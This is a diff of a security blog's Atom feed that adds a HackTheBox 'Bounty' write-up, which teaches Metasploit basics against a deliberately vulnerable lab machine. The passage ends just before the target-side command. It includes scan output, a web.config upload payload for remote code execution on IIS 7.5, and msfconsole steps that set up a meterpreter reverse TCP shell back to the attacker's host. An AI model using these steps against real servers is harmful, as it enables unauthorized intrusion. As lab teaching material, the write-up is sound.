@@ -1,8 +1,457 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-13T20:55:09+02:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/2018/10/10/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/2018/10/10/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/2018/10/10/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-10-28T22:39:10+01:00</updated><id>http://localhost:4000/</id><title type="html">Computer Security for Beginners</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/writeup/tutorial/web/2018/10/28/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/bounty-box.png&quot; alt=&quot;Bounty box&quot; title=&quot;Bounty Box&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This machine was pretty easy so I’m going to take this opportunity to explain you &lt;strong&gt;the basics of the Metasploit framework&lt;/strong&gt;.
+ &lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#metasploit-introduction&quot; id=&quot;markdown-toc-metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#initial-foothold&quot; id=&quot;markdown-toc-initial-foothold&quot;&gt;Initial Foothold&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application mapping&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#user-access&quot; id=&quot;markdown-toc-user-access&quot;&gt;User Access&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#meterpreter-shell&quot; id=&quot;markdown-toc-meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#meterpreter-shell-payload&quot; id=&quot;markdown-toc-meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#payload-incorporation&quot; id=&quot;markdown-toc-payload-incorporation&quot;&gt;Payload Incorporation&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#upload-webconfig-and-access-it&quot; id=&quot;markdown-toc-upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#back-to-msfconsole&quot; id=&quot;markdown-toc-back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#gimme-this-usertxt&quot; id=&quot;markdown-toc-gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#local-exploit-suggester&quot; id=&quot;markdown-toc-local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ms10_092_schelevator&quot; id=&quot;markdown-toc-ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#final-words&quot; id=&quot;markdown-toc-final-words&quot;&gt;Final Words&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/h2&gt;
+
+&lt;p&gt;Metasploit is an open-source pentesting framework distributed by &lt;strong&gt;Rapid7&lt;/strong&gt;. It is extremly powerful and easy to use once you understand the logic.&lt;/p&gt;
+
+&lt;p&gt;You can use it for generating a bunch of payloads for every system or languages with &lt;strong&gt;msfvenom&lt;/strong&gt;. It can also be run as an interactive console for connecting to the target system and exploiting it without leaving the console.&lt;/p&gt;
+
+&lt;p&gt;Metasploit relies on &lt;strong&gt;modules&lt;/strong&gt;, which are specifically designed to exploit vulnerabilities. Each module has &lt;strong&gt;a list of options&lt;/strong&gt; that you have to set in order to adapt the exploit to your specific environment. Then, you type “exploit” and &lt;strong&gt;Metasploit does the job for you&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;This tool is &lt;strong&gt;extremely powerful&lt;/strong&gt; when you want to exploit something quickly but it is &lt;strong&gt;not the best approach&lt;/strong&gt; in a learning process because everything is done hunder the hood and you don’t really know what happens on the system. To be used with caution… :wink:&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
+
+&lt;p&gt;Back to our Bounty machine, we will perform the usual steps of &lt;strong&gt;information gathering&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;
+
+&lt;p&gt;First, run a &lt;strong&gt;nmap&lt;/strong&gt; scan with default scripts and version detection enabled. We will run a deeper scan if nothing is found.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.70 scan initiated Sun Oct 21 13:58:33 2018 as: nmap -sC -sV -oA nmap/bounty 10.10.10.93&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.93
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.039s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Oct 21 13:58:45 2018 -- 1 IP address (1 host up) scanned in 12.07 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A single open port doesn’t seem like much so we will run a deeper scan in background while we start investigating this website.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We can notice that the webserver runs on IIS 7.5, which is completely outdated since the last version is 10.0.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;web-application-mapping&quot;&gt;Web Application mapping&lt;/h3&gt;
+
+&lt;p&gt;A good practice for saving time is to start running a directory listing tool such as &lt;strong&gt;dirbuster&lt;/strong&gt; or &lt;strong&gt;gobuster&lt;/strong&gt; before playing with the website’s features manually. I prefer using &lt;strong&gt;gobuster&lt;/strong&gt; since it’s a bit faster.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty/dirb&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The scan will take a few minutes so we will check the results later.&lt;/p&gt;
+
+&lt;p&gt;Let’s see what this website looks like…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/website.png&quot; alt=&quot;Bounty website&quot; title=&quot;Bounty website&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A wonderful merlin drawing! It might be an hint.&lt;/p&gt;
+
+&lt;p&gt;The source code doesn’t reveal anything more… Hopefully gobuster will fly to our rescue!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gobuster/bounty 
+/UploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/uploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/uploadedfiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;strong&gt;/uploadedfiles/&lt;/strong&gt; directory seems very interesting but access is denied. However, an educated guess could tell that there should be an upload page somewhere…&lt;/p&gt;
+
+&lt;p&gt;We also know that the server is running on IIS so file extensions should be &lt;strong&gt;asp&lt;/strong&gt; or &lt;strong&gt;aspx&lt;/strong&gt;. We can refine our search by adding &lt;code class=&quot;highlighter-rouge&quot;&gt;-x .aspx&lt;/code&gt; to gobuster, based on the assumptions we just made.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .aspx &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty.aspx
+
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+Gobuster v2.0.0              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://10.10.10.93/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 50
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : aspx
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+2018/10/27 22:43:30 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+/transfer.aspx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Running it only a few seconds is enough to reveal &lt;strong&gt;transfer.aspx&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/transfer.png&quot; alt=&quot;Transfer.aspx&quot; title=&quot;Transfer.aspx&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We found our entry point. Let’s exploit it!&lt;/p&gt;
+
+&lt;h2 id=&quot;user-access&quot;&gt;User Access&lt;/h2&gt;
+
+&lt;p&gt;Googling “IIS 7.5 upload RCE” teaches us that &lt;strong&gt;ASP&lt;/strong&gt; code can be executed by uploading a file called &lt;strong&gt;web.config&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;We will test if the website is vulnerable by uploading the following file:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;         
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
+               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
+               &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
+Response.write(&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&amp;gt;&quot;)
+Response.write(1+2)
+Response.write(&quot;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!-&quot;&amp;amp;&quot;-&quot;)
+%&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The ASP code is located at the very bottom of the file, between &lt;strong&gt;&amp;lt;%&lt;/strong&gt; and &lt;strong&gt;%&amp;gt;&lt;/strong&gt;. With this payload, the server should return “3” if it is vulnerable.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/uploaded.png&quot; alt=&quot;File uploaded&quot; title=&quot;File uploaded&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our file uploaded successfully so it means this file extension is allowed. We will suppose that files are not renamed during the upload so we will try to access it at &lt;strong&gt;/uploadedfiles/web.config&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/vulnerable.png&quot; alt=&quot;RCE vulnerability test&quot; title=&quot;RCE vulnerability test&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It works! :fireworks: Now we should be able to execute commands on the web server.&lt;/p&gt;
+
+&lt;h3 id=&quot;meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/h3&gt;
+
+&lt;p&gt;A reverse shell is generally what we are looking for when it comes to RCE. This time we will do better!&lt;/p&gt;
+
+&lt;p&gt;Metasploit can generate specific payloads but also setup a listener that will wait for the return of our reverse shell.
+But why would we do that? Because it offers the possibility to execute metasploit exploit modules directly inside our remote session.
+We can also juggle between several sessions, which can be pretty useful in some cases.&lt;/p&gt;
+
+&lt;p&gt;Here is the list of steps we will follow:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate our &lt;strong&gt;meterpreter shell payload&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Incorporate the payload into the &lt;strong&gt;web.config&lt;/strong&gt; file.&lt;/li&gt;
+  &lt;li&gt;Upload the web.config file.&lt;/li&gt;
+  &lt;li&gt;Access the uploaded file in order to trigger the payload.&lt;/li&gt;
+  &lt;li&gt;See what happens…&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/h4&gt;
+
+&lt;p&gt;First, we have to run Metasploit console with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;. Then, we will use the &lt;strong&gt;web delivery script&lt;/strong&gt; exploit module. A module is loaded with the keyword &lt;em&gt;“use”&lt;/em&gt;, followed by the path of the module.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/multi/script/web_delivery 
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, you can type &lt;em&gt;“options”&lt;/em&gt; to list all available parameters for this module:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name     Current Setting  Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   SRVHOST  0.0.0.0          yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;host to listen on. This must be an address on the &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;machine or 0.0.0.0
+   SRVPORT  8080             yes       The &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;port to listen on.
+   SSL      &lt;span class=&quot;nb&quot;&gt;false            &lt;/span&gt;no        Negotiate SSL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;incoming connections
+   SSLCert                   no        Path to a custom SSL certificate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is randomly generated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   URIPATH                   no        The URI to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default is random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+
+Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name   Current Setting  Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   LHOST                   yes       The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+   0   Python
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will now specify several parameters in order to adapt the payload to our environment.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SRVHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
+SRVHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;TARGET 2  &lt;span class=&quot;c&quot;&gt;# TARGET 2 = powershell payload &lt;/span&gt;
+TARGET &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 2
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp  &lt;span class=&quot;c&quot;&gt;# The payload we want to inject, a reverse shell&lt;/span&gt;
+PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# IP address for the reverse shell&lt;/span&gt;
+LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit running as background job 0.
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4444 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Server started.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Run the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;on the target machine:
